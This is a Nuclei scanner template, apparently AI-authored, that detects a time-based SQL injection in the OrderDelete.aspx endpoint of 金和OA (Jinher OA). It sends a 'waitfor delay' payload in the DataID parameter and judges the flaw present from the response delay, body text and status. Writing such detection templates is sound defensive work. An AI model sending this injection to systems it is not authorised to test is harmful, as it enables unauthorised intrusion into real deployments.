id: jinher-jhsoft-orderdelete-sqli
info:
  name: 金和OA OrderDelete.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL injection vulnerability in 金和OA OrderDelete.aspx endpoint.

variables:
  t1: '{{rand_int(2, 5)}}'
  t2: '{{to_number(t1) + to_number(t1)}}'
  t3: '{{to_number(t2) + 2}}'

http:
  - raw:
      - |
        GET /c6/JHSoft.Web.CrmOrder/OrderDelete.aspx/?DataID=1;waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei-SQLI-Test

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "工作标准"
          - "添加关联流程"
          - "JHSoft"
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t2)"
          - "duration <= to_number(t3)"
